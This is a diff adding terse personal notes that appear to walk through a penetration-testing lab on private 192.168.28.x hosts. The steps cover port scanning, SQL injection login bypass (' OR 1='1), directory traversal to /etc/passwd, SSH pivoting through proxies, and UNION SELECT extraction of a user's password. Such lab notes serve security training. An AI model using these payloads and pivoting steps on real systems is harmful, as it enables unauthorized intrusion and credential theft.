@@ -1,0 +1,93 @@
+provided the 192.168.28.161
+
+nmap the 192.168.28.161
+result 
+port 22
+port 80
+
+banner grab ports
+nc ..161 22  -> SSH
+nc ..161 80  -> WEBPAGE
+
+firefox -> input ip
+interact with ALL tabs on webpage and pages found on scripts
+
+found credentials on a page
+
+login page
+authentication bypass
+' OR 1='1
+successful
+F12
+Network
+resend auth bypass
+see post request
+click requeest
+click raw
+paste into url at end adding ? before input
+found credentials ------view page source for better format
+
+
+career page
+file to read
+directory traversal
+../../../../../../etc/passwd
+find user with interactive shell ---- user2 was only user found earlier with shell
+../etc/hosts
+found an ip
+
+ssh as user2
+
+user2 has simple sh (/bin/sh) run bash for better shell
+
+sudo -l 
+no permissions
+
+run Ruby ping sweep
+192.168.28.172,181
+
+make master socket to .161
+
+make dynamic to .161
+
+proxy nmap the .172 and .181
+
+navigate to 80 webpage
+
+
+POST SQL needed
+find vuln field with OR 1=1
+find number of fields UNION SELECT 1...
+order of fields might be mismatched, alter golden statement as needed
+use golden statement
+
+
+... UNION SELECT user_id,name,username FROM siteusers.users #
+
+user Aaron : ncnffjbeqlCn$$jbeq -> apassyPa$$word
+
+try new creds on site
+
+
+try new creds on new box
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
